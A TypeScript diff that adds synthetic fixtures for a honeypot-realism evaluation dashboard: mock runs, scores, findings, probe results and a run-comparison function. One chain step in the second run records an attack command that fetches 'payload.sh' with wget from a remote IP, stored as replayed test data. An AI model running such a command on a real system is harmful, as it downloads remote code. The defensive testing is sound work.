@@ -8,10 +8,13 @@
 import type {
   AttackSession,
   AttackerProfile,
+  EvaluationRun,
+  EvaluationRunSummary,
   Honeypot,
   HoneypotEvent,
   Indicator,
   MitreTechnique,
+  RunComparison,
   ServiceStatus,
   SessionAnalysis,
   SessionTimelineEvent,
@@ -1125,3 +1128,290 @@ export const reports: ThreatReport[] = [
     recommendedActions: analysisFor8F42A1.recommendedActions,
   },
 ];
+
+/**
+ * EVALUATION FIXTURES — synthetic honeypot-realism runs.
+ *
+ * These exist to exercise the shapes the UI must survive, not to flatter it:
+ *
+ *  * `evaluationRunB` has evaluatorStatus "unavailable", evaluatorModel null
+ *    and EVERY evaluatorRating null. Nothing may render those as 0.0 — a null
+ *    is a gap in what we could measure, not a verdict against the honeypot.
+ *  * `evaluationRunC` is status "failed" while every module is "completed":
+ *    OUR orchestration failed after the modules measured what they measured.
+ *    It must not be relabelled as a honeypot failure.
+ *  * `evaluationRunA` carries a null deterministicScore on `context` and omits
+ *    `attack_possibilities` entirely (that run replayed no chains) — an absent
+ *    characteristic and a null one are different things.
+ *
+ * deterministicScore and evaluatorRating are never combined anywhere here.
+ */
+const evaluationRunA: EvaluationRun = {
+  id: "8f3c1d20-4a55-4f18-9b2e-6c1a77d90a11",
+  honeypotId: "hp-cowrie-ssh-01",
+  status: "completed",
+  startedAt: at("09:12:04"),
+  finishedAt: at("09:18:41"),
+  agentModel: "llama3.1:8b",
+  evaluatorModel: "llama3.1:8b",
+  evaluatorStatus: "completed",
+  honeypotFingerprint: "cowrie@2.5.0+cfg:4f19a3c8",
+  evaluationConfigFingerprint: "probes@3+chains@2+rules@7",
+  // `attack_possibilities` is absent, not null: this run replayed no chains.
+  categoryScores: [
+    { characteristic: "basic_commands", deterministicScore: 0.86, evaluatorRating: 0.72 },
+    { characteristic: "file_system", deterministicScore: 0.64, evaluatorRating: 0.55 },
+    { characteristic: "services", deterministicScore: 0.41, evaluatorRating: 0.38 },
+    { characteristic: "sanity", deterministicScore: 0.78, evaluatorRating: 0.81 },
+    // Nothing was established for `context`: null, never 0.
+    { characteristic: "context", deterministicScore: null, evaluatorRating: 0.44 },
+  ],
+  modules: [
+    { module: "static_nmap", moduleStatus: "completed", detail: null },
+    { module: "shell_probes", moduleStatus: "completed", detail: null },
+    {
+      module: "attack_chains",
+      moduleStatus: "skipped",
+      detail: "no chain matched the honeypot profile",
+    },
+  ],
+  findings: [
+    {
+      id: "9d2f6b41-77aa-4c19-8f30-2b5e91d0c344",
+      characteristic: "services",
+      severity: "high",
+      finding:
+        "The SSH banner advertises OpenSSH 6.0p1 while the shell reports Debian 12, a pairing that shipped together on no real distribution.",
+      recommendation: "Align the advertised banner with the emulated distribution release.",
+      source: "deterministic",
+      evidence: [
+        {
+          kind: "probe",
+          esEventId: null,
+          chainStepId: null,
+          probeResultId: "aa11bb22-cc33-4d44-9e55-ff6677889900",
+        },
+      ],
+    },
+    {
+      id: "3c8e0a17-19bd-4f52-b6c7-84a2d5e61b9f",
+      characteristic: "file_system",
+      severity: "medium",
+      finding:
+        "/var/log contains only files with identical modification timestamps, which reads as a freshly provisioned image rather than a host in service.",
+      recommendation: "Age the log tree so timestamps spread across the claimed uptime.",
+      source: "evaluator",
+      evidence: [
+        {
+          kind: "probe",
+          esEventId: null,
+          chainStepId: null,
+          probeResultId: "bb22cc33-dd44-4e55-af66-001122334455",
+        },
+      ],
+    },
+  ],
+  chainSteps: [],
+  probeResults: [
+    {
+      id: "aa11bb22-cc33-4d44-9e55-ff6677889900",
+      module: "static_nmap",
+      probeId: "ssh-banner",
+      target: "22/tcp",
+      establishes: "ssh.banner",
+      value: "SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2",
+      factStatus: "observed",
+    },
+    {
+      id: "bb22cc33-dd44-4e55-af66-001122334455",
+      module: "shell_probes",
+      probeId: "var-log-listing",
+      target: "/var/log",
+      establishes: "fs.log_mtimes",
+      value: "12 entries, all mtime 2026-08-01T00:00:00Z",
+      factStatus: "observed",
+    },
+    {
+      id: "cc33dd44-ee55-4f66-b077-112233445566",
+      module: "shell_probes",
+      probeId: "dmesg-ring",
+      target: "dmesg",
+      // Nothing established: establishes/value stay null and the fact is
+      // `unknown`, which scoring excludes rather than counting against.
+      establishes: null,
+      value: null,
+      factStatus: "unknown",
+    },
+  ],
+};
+
+/**
+ * The null path the UI must not render as 0: the evaluator never ran, so there
+ * is no rating for any characteristic and no evaluator model to name.
+ */
+const evaluationRunB: EvaluationRun = {
+  id: "1b7e4a09-5d31-42c6-8a10-c9f2b40e5d77",
+  honeypotId: "hp-cowrie-ssh-01",
+  status: "completed",
+  startedAt: at("11:44:19"),
+  finishedAt: at("11:49:02"),
+  agentModel: "llama3.1:8b",
+  evaluatorModel: null,
+  evaluatorStatus: "unavailable",
+  honeypotFingerprint: "cowrie@2.5.0+cfg:9a72e5b1",
+  evaluationConfigFingerprint: "probes@3+chains@2+rules@7",
+  categoryScores: [
+    { characteristic: "basic_commands", deterministicScore: 0.91, evaluatorRating: null },
+    { characteristic: "file_system", deterministicScore: 0.7, evaluatorRating: null },
+    { characteristic: "services", deterministicScore: 0.52, evaluatorRating: null },
+    { characteristic: "attack_possibilities", deterministicScore: 0.33, evaluatorRating: null },
+    { characteristic: "sanity", deterministicScore: 0.8, evaluatorRating: null },
+    { characteristic: "context", deterministicScore: null, evaluatorRating: null },
+  ],
+  modules: [
+    { module: "static_nmap", moduleStatus: "completed", detail: null },
+    { module: "shell_probes", moduleStatus: "timeout", detail: "budget reached after 41 probes" },
+    { module: "attack_chains", moduleStatus: "completed", detail: null },
+  ],
+  // No evaluator means no evaluator findings; only the deterministic one.
+  findings: [
+    {
+      id: "6f1a83c5-40de-4b27-9c88-7e05a3b19d62",
+      characteristic: "attack_possibilities",
+      severity: "high",
+      finding:
+        "wget reported a successful download but the retrieved file never appeared on disk, contradicting the shell's own success message.",
+      recommendation: "Persist downloaded artifacts so the filesystem agrees with command output.",
+      source: "deterministic",
+      evidence: [
+        {
+          kind: "chain_step",
+          esEventId: null,
+          // The backend's ChainStepOut carries no id, so a chain-step citation
+          // has nothing in `chainSteps` to resolve against. Shown as it is.
+          chainStepId: "7a90b2c1-3de4-4f56-8901-a2b3c4d5e6f7",
+          probeResultId: null,
+        },
+      ],
+    },
+  ],
+  chainSteps: [
+    {
+      chainId: "download-and-execute",
+      stepIndex: 0,
+      command: "wget http://31.44.185.9/payload.sh",
+      cowrieEventId: "EVT-8F42A1-0007",
+      matchedRuleId: "rule-ingress-tool-transfer",
+      expectedTechniqueId: "T1105",
+      factStatus: "observed",
+    },
+    {
+      chainId: "download-and-execute",
+      stepIndex: 1,
+      command: "ls -l payload.sh",
+      cowrieEventId: null,
+      matchedRuleId: null,
+      expectedTechniqueId: "T1105",
+      factStatus: "not_observed",
+    },
+  ],
+  probeResults: [
+    {
+      id: "dd44ee55-ff66-4077-8188-223344556677",
+      module: "static_nmap",
+      probeId: "ssh-banner",
+      target: "22/tcp",
+      establishes: "ssh.banner",
+      value: "SSH-2.0-OpenSSH_9.2p1 Debian-2+deb12u3",
+      factStatus: "observed",
+    },
+  ],
+};
+
+/**
+ * status "failed" with every module "completed" — a real state. The modules
+ * measured what they measured; our own orchestration is what failed.
+ */
+const evaluationRunC: EvaluationRun = {
+  id: "c40a9e63-2f88-4b71-a3d5-0e6b18f42c05",
+  honeypotId: "hp-ubuntu-web-01",
+  status: "failed",
+  startedAt: at("13:02:55"),
+  finishedAt: at("13:07:12"),
+  agentModel: "llama3.1:8b",
+  evaluatorModel: "llama3.1:8b",
+  evaluatorStatus: "evaluator_failed",
+  honeypotFingerprint: "cowrie@2.5.0+cfg:9a72e5b1",
+  evaluationConfigFingerprint: "probes@3+chains@2+rules@7",
+  categoryScores: [
+    { characteristic: "basic_commands", deterministicScore: 0.88, evaluatorRating: null },
+    { characteristic: "services", deterministicScore: 0.49, evaluatorRating: null },
+  ],
+  modules: [
+    { module: "static_nmap", moduleStatus: "completed", detail: null },
+    { module: "shell_probes", moduleStatus: "completed", detail: null },
+    { module: "attack_chains", moduleStatus: "completed", detail: null },
+  ],
+  findings: [],
+  chainSteps: [],
+  probeResults: [],
+};
+
+export const evaluationRuns: EvaluationRun[] = [evaluationRunA, evaluationRunB, evaluationRunC];
+
+const toEvaluationSummary = (run: EvaluationRun): EvaluationRunSummary => ({
+  id: run.id,
+  honeypotId: run.honeypotId,
+  status: run.status,
+  startedAt: run.startedAt,
+  finishedAt: run.finishedAt,
+  agentModel: run.agentModel,
+  evaluatorModel: run.evaluatorModel,
+  evaluatorStatus: run.evaluatorStatus,
+  honeypotFingerprint: run.honeypotFingerprint,
+  evaluationConfigFingerprint: run.evaluationConfigFingerprint,
+  categoryScores: run.categoryScores,
+});
+
+/** Newest first, matching the backend's ordering. */
+export const evaluationRunSummaries: EvaluationRunSummary[] = [
+  toEvaluationSummary(evaluationRunC),
+  toEvaluationSummary(evaluationRunB),
+  toEvaluationSummary(evaluationRunA),
+];
+
+/**
+ * Build a comparison the way the backend does, so the demo shows the same
+ * ambiguity a real one has: a null delta is either "not established on one
+ * side" or "not measured in this run", and this payload cannot tell them apart.
+ */
+export function compareEvaluationRuns(base: EvaluationRun, head: EvaluationRun): RunComparison {
+  const differences: string[] = [];
+  if (base.honeypotFingerprint !== head.honeypotFingerprint) {
+    differences.push("honeypotFingerprint");
+  }
+  if (base.evaluationConfigFingerprint !== head.evaluationConfigFingerprint) {
+    differences.push("evaluationConfigFingerprint");
+  }
+  const deltas: Record<string, number | null> = {};
+  const characteristics = new Set([
+    ...base.categoryScores.map((score) => score.characteristic),
+    ...head.categoryScores.map((score) => score.characteristic),
+  ]);
+  for (const characteristic of characteristics) {
+    const from = base.categoryScores.find((score) => score.characteristic === characteristic);
+    const to = head.categoryScores.find((score) => score.characteristic === characteristic);
+    // A delta against "not established" is not a delta. Null, never 0.
+    deltas[characteristic] =
+      from?.deterministicScore == null || to?.deterministicScore == null
+        ? null
+        : to.deterministicScore - from.deterministicScore;
+  }
+  return {
+    base,
+    head,
+    classification: differences.length === 0 ? "same_configuration" : "configuration_changed",
+    differences,
+    deltas,
+  };
+}
